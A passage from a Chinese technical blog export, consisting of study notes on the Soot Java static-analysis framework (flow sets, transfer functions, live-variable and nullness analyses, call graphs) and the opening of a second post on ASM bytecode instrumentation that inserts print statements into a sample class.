<p>注：merge(..)本质上指的是控制流的交汇运算，一般根据待分析的具体问题来决定采用并集还是交集。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(Object in1, Object in2, Object out)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">	FlowSet inSet1 = (FlowSet)in1,</span><br><span class="line">	inSet2 = (FlowSet)in2,</span><br><span class="line">	outSet = (FlowSet)out;</span><br><span class="line">	<span class="comment">//inSet1.union(inSet2, outSet);</span></span><br><span class="line">	inSet1.intersection(inSet2, outSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>flowThrough(..)  大名鼎鼎的transfer function</p>
<p>flowThrough(..)方法是真正的执行流函数，它有三个参数：A in-set、被处理的N类型节点（一般指的就是句子Unit）、A out-set。这个方法的实现内容完全取决于你的分析。</p>
<p>注：flowThrough()本质上就是一个传递函数。在一个语句之前和之后的数据流值受该语句的语义的约束。比如，假设我们的数据流分析涉及确定各个程序点上各变量的常量值。如果变量a在执行语句b=a之前的值为v，那么在该语句之后a和b的值都是v。一个赋值语句之前和之后的数据流值的关系被称为传递函数。针对前向分析和后向分析，传递函数有两种风格。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">flowThrough</span><span class="params">(Object in, Object d, Object out)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">	FlowSet inSet = (FlowSet)in,</span><br><span class="line">	FlowSet outSet = (FlowSet)out;</span><br><span class="line">	Unit u = (Unit) d;</span><br><span class="line">	kill(inSet,u,outSet);</span><br><span class="line">	gen(outSet,u);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">kill</span><span class="params">(FlowSet inSet, Unit u, FlowSet outSet)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">	FlowSet kills = (FlowSet)emptySet.clone();<span class="comment">//Unit的kills</span></span><br><span class="line">	Iterator defIt = u.getDefBoxes().iterator();</span><br><span class="line">	<span class="keyword">while</span>(defIt.hasNext())&#123;</span><br><span class="line">		ValueBox defBox = (ValueBox)defIt.next();</span><br><span class="line">			</span><br><span class="line">		<span class="keyword">if</span>(defBox.getValue() <span class="keyword">instanceof</span> Local)&#123;</span><br><span class="line">			Iterator inIt = inSet.iterator();</span><br><span class="line">			<span class="keyword">while</span>(inIt.hasNext())&#123;</span><br><span class="line">				Local inValue = (Local)inIt.next();</span><br><span class="line">				<span class="keyword">if</span>(inValue.equivTo(defBox.getValue()))&#123;</span><br><span class="line">					kills.add(defBox.getValue());</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	inSet.difference(kills, outSet);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">gen</span><span class="params">(FlowSet outSet, Unit u)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">	Iterator useIt = u.getUseBoxes().iterator();</span><br><span class="line">	<span class="keyword">while</span>(useIt.hasNext())&#123;</span><br><span class="line">		ValueBox e = (ValueBox)useIt.next();</span><br><span class="line">		<span class="keyword">if</span>(e.getValue() <span class="keyword">instanceof</span> Local)</span><br><span class="line">			outSet.add(e.getValue());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Flow-sets"><a href="#Flow-sets" class="headerlink" title="Flow-sets"></a>Flow-sets</h2><p>在soot中，flow sets代表control-flow-graph中与节点相关的数据集合。</p>
<p>CFG中的每个节点，都有一个flowset与之关联。</p>
<p>Flow set存在有边界的（需要实现BoundedFlowSet接口）和无边界的（需要实现FlowSet接口）两种表达。</p>
<p><strong>有边界的集合知道possible值的全体集合(适合指针分析)，而无边界的集合则不知道。</strong></p>
<h3 id="interface-FlowSet-lt-T-gt"><a href="#interface-FlowSet-lt-T-gt" class="headerlink" title="interface FlowSet&lt;T&gt;"></a>interface FlowSet<code>&lt;T&gt;</code></h3><p>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">FlowSet&lt;T&gt; <span class="title">clone</span><span class="params">()</span></span>; <span class="comment">//克隆当前FlowSet的集合</span></span><br><span class="line"></span><br><span class="line"><span class="function">FlowSet&lt;T&gt; <span class="title">emptySet</span><span class="params">()</span></span>;<span class="comment">//返回一个空集，通常比((FlowSet)clone()).clear()效率更高</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy</span><span class="params">(FlowSet&lt;T&gt; dest)</span></span>;<span class="comment">//拷贝当前集合到dest集合中</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span>;<span class="comment">//返回该flowset的清空</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">union</span><span class="params">(FlowSet&lt;T&gt; other)</span></span>; <span class="comment">//将FlowSet ∪nion other 并集返回值再赋给FlowSet</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">union</span><span class="params">(FlowSet&lt;T&gt; other, FlowSet&lt;T&gt; dest)</span></span>; <span class="comment">// FlowSet ∪ other = dest，其中other、dest可以与该FlowSet一样</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">intersection</span><span class="params">(FlowSet&lt;T&gt; other)</span></span>; <span class="comment">//FlowSet ∩ other = FlowSet</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">intersection</span><span class="params">(FlowSet&lt;T&gt; other, FlowSet&lt;T&gt; dest)</span></span>; <span class="comment">//FlowSet ∩ other = dest 其中，dest、other可以和该FlowSet一样</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">difference</span><span class="params">(FlowSet&lt;T&gt; other)</span></span>; <span class="comment">// FlowSet-other = FlowSet</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">difference</span><span class="params">(FlowSet&lt;T&gt; other, FlowSet&lt;T&gt; dest)</span></span>; <span class="comment">// FlowSet-other = dest,其中，dest、other和FlowSet可能相同。</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(T var1)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(T var1, FlowSet&lt;T&gt; var2)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">(T var1)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">(T var1, FlowSet&lt;T&gt; var2)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(T var1)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isSubSet</span><span class="params">(FlowSet&lt;T&gt; var1)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">Iterator&lt;T&gt; <span class="title">iterator</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">List&lt;T&gt; <span class="title">toList</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>上述方法足以使flow sets成为一个有效的lattice元素。</p>
<p>而对于有边界的flowset，需要实现BoundedFlowSet接口</p>
<p>它需要提供方法，该方法能够产生set‘s complement（补集）和它的topped set（全集）（一个lattice element包括所有的可能的值的集合）。</p>
<img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210329153258001.png" alt="image-20210329153258001" style="zoom:80%;">

<h3 id="四种flow-sets的实现"><a href="#四种flow-sets的实现" class="headerlink" title="四种flow sets的实现"></a>四种flow sets的实现</h3><p>ArraySparseSet,ArrayPackedSet,ToppedSet和DavaFlowSet。</p>
<img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210329153345586.png" alt="image-20210329153345586" style="zoom:67%;">

<p>ArraySparseSet:是一个无界限的flowset。该set代表一个数组引用。注意：当比较元素是否相等时，一般使用继承自Object对象的equals。但是在soot中的元素都是代表一些代码结构，不能覆写equals方法。而是实现了interface soot.EquivTo。因此，如果你需要一个包含类似binary operation expressions的集合，你需要使用equivTo方法实现自定义的比较方法去比较是否相等。</p>
<p>ArrayPackedSet : 有界flow set。需要提供FlowUniverse 对象，即代表全集的容器。由一个在integer和object双向map和一个用来表示全集成员是否在内的bit vector表示。</p>
<p>ToppedSet : 在基于上面两种的set前提下，加入额外信息来表示其为lattice中的Top。</p>
<h2 id="soot官方例子"><a href="#soot官方例子" class="headerlink" title="soot官方例子"></a>soot官方例子</h2><h3 id="Live-Variables-Analysis"><a href="#Live-Variables-Analysis" class="headerlink" title="Live Variables Analysis"></a>Live Variables Analysis</h3><p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210430181603345.png" alt="image-20210430181603345"></p>
<p>变量v是live状态的条件是：</p>
<p>从v的定义点p开始，v就是活跃的，一直到use(v)地方，中间没有对v的<strong>重定义</strong>；</p>
<h4 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h4><p>May-analysis : BackwardAnalysis 下面这张图 倒着看 效果会更好！</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210430201447240.png" alt="image-20210430201447240"></p>
<p>在soot里面，后向分析可以继承BackwardFlowAnalysis抽象类。</p>
<p>汇聚点的操作是<strong>union</strong></p>
<p>变量集合可以是继承了FlowSet的ArraySparseSet集合</p>
<h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>copy和merge的具体操作：</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210430202734875.png" alt="image-20210430202734875"></p>
<p><strong>copy()</strong></p>
<p>copy就是<strong>直接</strong>把当前节点的IN copy 给上一个BB块的OUT</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210501161528622.png" alt="image-20210501161528622"></p>
<p><strong>merge()</strong></p>
<p>由于是union ， 所以是把分叉点的两个IN union取并集 为分支点的OUT</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210501162907634.png" alt="image-20210501162907634"></p>
<h4 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h4><p><strong>flowThrough()</strong></p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210501163108300.png" alt="image-20210501163108300"></p>
<p>例如: x = y * z</p>
<p>backwardanalysis分析：先kill def[x] ,再 gen use[y,z]</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kill </span></span><br><span class="line"><span class="comment">// for each local v def’d in this unit, remove v from dest</span></span><br><span class="line"><span class="keyword">for</span>(ValueBox box : ut.getDefBoxes())&#123;</span><br><span class="line">	Value value = box.getValue();</span><br><span class="line">  <span class="keyword">if</span>( value <span class="keyword">instanceof</span> Local )&#123;</span><br><span class="line">    dest.remove( value );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// gen</span></span><br><span class="line"><span class="comment">// for each local v used in this unit, add v to dest</span></span><br><span class="line"><span class="keyword">for</span> (ValueBox box : ut.getUseBoxes())&#123;</span><br><span class="line">	Value value = box.getValue();</span><br><span class="line">	<span class="keyword">if</span> (value <span class="keyword">instanceof</span> Local)&#123;</span><br><span class="line">    dest.add(value);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h4><p><strong>Initial values</strong></p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210501170326266.png" alt="image-20210501170326266"></p>
<h4 id="step5"><a href="#step5" class="headerlink" title="step5"></a>step5</h4><p><strong>Constructor</strong></p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210501172943670.png" alt="image-20210501172943670"></p>
<h4 id="step6"><a href="#step6" class="headerlink" title="step6"></a>step6</h4><p><strong>Enjoy result</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LiveVariablesAnalysis lv = <span class="keyword">new</span> LiveVariablesAnalysis(g);</span><br><span class="line"><span class="comment">// return SparseArraySets of live variables:</span></span><br><span class="line">lv.getFlowBefore(s);</span><br><span class="line">lv.getFlowAfter(s);</span><br></pre></td></tr></table></figure>



<h3 id="Branched-Nullness-Analysis"><a href="#Branched-Nullness-Analysis" class="headerlink" title="Branched Nullness Analysis"></a>Branched Nullness Analysis</h3><p> 定义：</p>
<p>如果所有到达s的control-flow path 都导致v被分配了一个非null的值，那么局部变量v在s处就是非null的。</p>
<p>图示：</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210504160140618.png" alt="image-20210504160140618"></p>
<h4 id="step1-1"><a href="#step1-1" class="headerlink" title="step1"></a>step1</h4><p>选择实现ForwardBranchedFlowAnalysis</p>
<h4 id="step2-1"><a href="#step2-1" class="headerlink" title="step2"></a>step2</h4><p>和上一个例子一样：</p>
<p>copy()</p>
<p>forward 正常copy就行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">copy</span><span class="params">(Object src, Object dest)</span> </span>&#123;</span><br><span class="line">  FlowSet sourceSet = (FlowSet)src,</span><br><span class="line">  destSet = (FlowSet) dest;</span><br><span class="line">  sourceSet.copy(destSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>merge()</p>
<p>如果一个变量v在从开始到s的所有路径上都是非空的，那么它就是非空的，所以<strong>取交集</strong>，intersection()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(...)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// [cast Objects to FlowSets]</span></span><br><span class="line">  srcSet1.intersection(srcSet2,destSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="step3-1"><a href="#step3-1" class="headerlink" title="step3"></a>step3</h4><p>设计 flow function</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210504161739103.png" alt="image-20210504161739103"></p>
<h1 id="零散知识点"><a href="#零散知识点" class="headerlink" title="零散知识点"></a>零散知识点</h1><p>以$开头的都是临时变量，表示相对堆栈位置，并不是源程序中的局部变量，。</p>
<p>没有$的局部变量则代表真正的局部变量。</p>
<p>jtp是允许用户自定义的，wjtp全程序转换包</p>
<p><strong>clinit</strong>方法<strong>clinit是</strong>类构造器方法，也就是在jvm在进行类加载-验证-解析-初始化中的<strong>初始化</strong>阶段，jvm会调用<strong>clinit</strong>. <strong>clinit</strong>方法<strong>是</strong>在类加载过程中执行的，而init方法<strong>是</strong>在对象实例化执行的。</p>
<p>soot的控制流图在soot.toolkits.graph这个包内；</p>
<p>Annotating Code</p>
<p>四个接口：</p>
<ul>
<li>Host：是可以容纳和管理标签的对象。就像SootClass、SootField、Body、Unit、Value、ValueBox等</li>
<li>Tag：可以给Host打标记的对象，很通用，用来标记name-vlaue对给Host</li>
<li>Attribute：是Tag的拓展。任何属于属性的东西都可以输出到文件中。Soot里有一个tool叫做SootClass，可以输出直接码ByteCode，任何应该输出到类文件的东西都必须extend JasminAttribute。</li>
</ul>
<p>CallGraph的方法调用</p>
<p>Soot中调用图的所有已知方法调用edge边的集合。</p>
<p>包括：</p>
<p>显式方法调用</p>
<p>隐式静态初始化器</p>
<p>隐式调用Thread.run()</p>
<p>隐式调用</p>
<p>调用图的每一条边edge对象都存在四个元素：</p>
<p>源方法 source method</p>
<p>源语句 source statement</p>
<p>目标方法 target method、</p>
<p>边的种类，例如静态调用invoke static 、虚拟调用 invoke virtual、接口调用invoke interface</p>
<p>CallGraph也有几个经典方法：</p>
<p><code>edgesInto(method)</code>：查询进入method方法的边</p>
<p><code>edgesOutOf(method)</code>：从method方法流出来的边</p>
<p><code>edgesOutOf(statement)</code>：从特定语句statement流出来的边</p>
<p>每个方法其实都会返回一个Iterator来调度Edge边对象</p>
<p>Soot提供了三个适配器来针对Edges进行分析：</p>
<ul>
<li>Sources：每条边的原方法</li>
<li>Units：每条边的原语句</li>
<li>Targets：每条边的目标方法</li>
</ul>
<p>例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printPossibleCallers</span><span class="params">(SootMethod target)</span></span>&#123;</span><br><span class="line">  CallGraph cg = Scene.v().getCallGraph();</span><br><span class="line">  Iterator sources = <span class="keyword">new</span> Sources(cg.edgesInto(target));</span><br><span class="line">  <span class="keyword">while</span>(sources.hasNext())&#123;</span><br><span class="line">    SootMethod src = (SootMethod)sources.next();</span><br><span class="line">    Sysytem.out.println(target + <span class="string">"might be called by "</span> + src);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>更详细的两个图类：</p>
<p><code>ReachableMethods</code>  and <code>TransitiveTargets</code></p>
<p><code>ReachableMethods</code></p>
<p>表示能从entrypoints开始 能reach到的方法集合</p>
<p>方法<code>contains(method)</code>表示去测试method方法能不能到达 能不能reachable</p>
<p>方法<code>listener()</code>返回的是一个迭代器遍历所有可达方法。</p>
<p><code>TransitiveTargets</code></p>
<p>表示从一个特定的方法能指向的所有方法，<strong>这个方法可以用来分析调用链</strong>。</p>
<p>构造函数接收（除了调用图之外）一个额外过滤器<code>Filter</code></p>
<p>Filter表示调用图中满足给定的<code>EdgePredicate</code>的边的子集。</p>
<p><code>EdgePredicate</code>是一组接口，它主要有两个实现，<code>ExplicitEdgespred</code> ,<code>InstanceInvokeEdgesPred</code>；</p>
<p>三个翻译器类：</p>
<p>JavaTranslator、StmtTranslator、ExprTranslator</p>
<p>JavaTranslator负责将给定的Java程序的方法进行翻译，然后将这些翻译之后的语句组合在一起。</p>
<p>它会维护着一个数组，数组会在<code>makeMethod</code>方法之后被初始化。</p>
<p><code>translate</code>方法是主要方法，这个方法会完成语句的翻译和链接。</p>
<p>StmtTranslator继承了AbstractStmtSwitch，他会翻译单独、独立的语句。</p>
<p>它的主要方法是<code>translateStmt</code>，这个方法其实会把StmtTranslator应用于语句，然后建立一个Map映射对，把Java语句和Jimple代码进行映射，对错误报告很方便。</p>
<p>此外还有一个方法是<code>addStatement</code>，它会将给定的语句添加到指定的方法中，它是整个翻译过程中用来添加语句的方法。</p>
<p>Subexpression是用ExprTranslator（它是AbstractJimpleValueSwitch类的拓展）来翻译的。</p>
<p>切入点是<code>translateExpr</code>方法，他是将Exprtranslator应用到给定的ValueBox上面。</p>
<p>两个有趣方法：</p>
<p><code>caseSpecialInvokerExpr</code>和<code>handleCall</code>；</p>
<p><code>caseSpecialInvokerExpr</code>是用来测试是否进行了对象的初始化，如果是的话，那么就创建一个Foo初始化语句；如果不是的话，那么就调用handleCall方法。</p>
<h1 id="过程内分析"><a href="#过程内分析" class="headerlink" title="过程内分析"></a>过程内分析</h1><p>数据流分析是针对某一个方法的控制流图（在Soot里面用的是UnitGragh）来分析的。由于是方法内的数据流分析，所以每一个节点都是Stmt语句。</p>
<p>一个UnitGraph会把每条语句作为节点node，两个节点所对应的语句如果能够流通，那么在图上就会有一条边。</p>
<p>每个节点会有两个集合，一个代表入集：in-set，一个代表出集：out-set。</p>
<p>这些集合会随着程序运行实时保存记录，直到遇到一个fixed-point点结束。</p>
<p>在Soot里面有三种数据流分析，分别是Forward/Backward/和Branched</p>
<p>ForwardFlowAnalysis：就是正向的数据分析，从程序的入口点entry point顺着一路下来分析；</p>
<p>BackWardsFlowAnalysis：逆向分析，从程序的结束点exit-node倒推。这里官方文档说可以顺着ForeardAnalysis来继续用，但是需要换成用InverseGraph，以后有空补上这个细节。</p>
<p>ForwardBranchedAnalysis：也是正向分析的一种，只不过会对if这样的分支语句进行分支分析。例如if(p!=null)，那么在当分析这一条语句时候，他其实就会自动分出分支，将<code>p is not null</code>放到then分支，然后把<code>p is null</code>放到else分支。</p>
<p><strong>实现Analysis接口</strong></p>
<p>ForwardFlowAnalysis是抽象类，继承关系如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AbstractFlowAnalysis&lt;N,A&gt; -&gt;FlowAnalysis&lt;N,A&gt;-&gt;ForwardFlowAnalysis&lt;N,A&gt;</span><br></pre></td></tr></table></figure>

<p>ForwardFlowAnalysis有两个参数：</p>
<ul>
<li><p>N：节点种类。通常是Unit</p>
</li>
<li><p>A：Abstraction Type 抽象类型。人们通常会用Set和Map来表示，但是，Soot要求抽象类型必须正确实现equals()和hashCode()方法，这样Soot才能确定何时到达一个固定点。</p>
</li>
</ul>
<p>构造函数：</p>
<p>要求：必须实现一个构造函数，该构造函数至少接收一个<a href="https://www.sable.mcgill.ca/soot/doc/soot/toolkits/graph/DirectedGraph.html" target="_blank" rel="noopener"><code>DirectedGraph</code></a>作为参数，其中N为节点类型，并且将它传递给父类的constructor；<code>super.init</code></p>
<p>并且在自定义的constructor最后，需要调用<code>doAnalysis()</code>函数，这个函数在最后才会分析数据流。</p>
<p>在调用superconstructor和doAnalysis()函数之间，你可以自定义分析数据结构。</p>
<p>方法：</p>
<p> <code>newInitialFlow()</code> and <code>entryInitialFlow()</code></p>
<p><code>newInitialFlow()</code>会返回一个抽象类型对象A，这个对象是每个node节点默认初始化的in-set和out-set。</p>
<p>特殊的是entry-point的in-set是通过<code>entryInitialFlow()</code>方法完成的。</p>
<p><code>copy()</code>方法接收两个A类型的参数，分别是source和target，该方法其实就是把source复制到target集合里面。</p>
<blockquote>
<p>The <code>copy(..)</code> method takes two arguments of type A (your abstraction), a source and a target. It merely copies the source into the target. Note that the class A has to provide appropriate methods. In particular, A may not be immutable. You can work around this limitation by using a box or set type for A.</p>
</blockquote>
<p><code>merge()</code>方法用来在分支汇聚点处汇聚flowsets</p>
<p>它会接收3个参数，分别是左分支和右分支还有一个额外分支，这个额外分支其实是为了下一个节点汇聚而成的in-set。</p>
<blockquote>
<p>Opposed to <code>copy(..)</code> it takes three arguments, an out-set from the left-hand branch, an out-set from the right-hand branch and another set, which is going to be the newly merged in-set for the next statement after the merge point.</p>
</blockquote>
<p>最后需要实现的方法是<code>flowThrough()</code>;</p>
<p><code>flowThrough()</code>方法会接收3个参数作为输入：</p>
<ol>
<li>A的in-set。</li>
<li>N类型的node，也就需要待处理的语句。</li>
<li>A的out-set。</li>
</ol>
<p>这个方法的内容完全取决于你的分析和抽象。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Soot</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次ASM插桩</title>
    <url>/%E8%AE%B0%E4%B8%80%E6%AC%A1ASM%E6%8F%92%E6%A1%A9/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>有志者，事竟成。</p>
</blockquote>
<p>今天来记录一次ASM插桩，接下来会主攻ASM框架了，“抽象中的抽象”。</p>
<a id="more"></a>

<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>实现如下代码注释的目标，<strong>在固定代码的前后，以及 return 语句之前插入逻辑</strong>，这基本上就可以满足实际的需求了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Music</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 编译期在这里插入代码 System.out.println("asm insert before");</span></span><br><span class="line">        System.out.println(<span class="string">"this is run"</span>);</span><br><span class="line">        <span class="comment">// 编译期在这里插入代码 System.out.println("asm insert after");</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"this is getValue"</span>);</span><br><span class="line">        <span class="comment">// 编译期在 return 语句之前插入 System.out.println("insert before return");</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(String value)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 注意方法 desc </span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(String value, Thread thread)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 注意方法 desc</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Music <span class="title">fake</span><span class="params">(<span class="keyword">int</span>[] nums, String[] values)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// 注意方法 desc</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><p>maven：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.ow2.asm<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>asm<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>分为3部分，首先我们直接上代码，待会儿再说理解：</p>
<h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Music music;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String PATH = <span class="string">"待转换的类路径"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">//待转换的类叫做Music</span></span><br><span class="line">            ClassReader cr = <span class="keyword">new</span> ClassReader(<span class="string">"FKtemp.Music"</span>);</span><br><span class="line">            ClassWriter cw = <span class="keyword">new</span> ClassWriter(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">            ClassVisitor cv = <span class="keyword">new</span> MyVisitor(cw);</span><br><span class="line">            cr.accept(cv,ClassReader.EXPAND_FRAMES);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] result = cw.toByteArray();</span><br><span class="line">          <span class="comment">//转换之后的类叫做damn</span></span><br><span class="line">            File file = <span class="keyword">new</span> File(PATH+<span class="string">"damn.class"</span>);</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">            fos.write(result);</span><br><span class="line">            fos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>理解：</p>
<ol>
<li>待转换的类叫做Music，我先写一个ClassReader去读取这个类；</li>
<li>写一个ClassWriter，cw，去读取，参数COMPUTE_MAXS的意思是自动计算局部变量与操作数栈部分的大小；</li>
<li><code>ClassVisitor cv = new MyVisitor(cw);</code>可以看到用了多态，这个MyVisitor是需要在后续完成的自定义组件；我们的cv也需要委托cw；</li>
<li><code>cr.accept(cv,ClassReader.EXPAND_FRAMES);</code>cr再委托给cv去做。</li>
</ol>
<h2 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h2><p>这一部分就是我们自定义的ClassVisitor，叫做MyVisitor。直接上代码：</p>
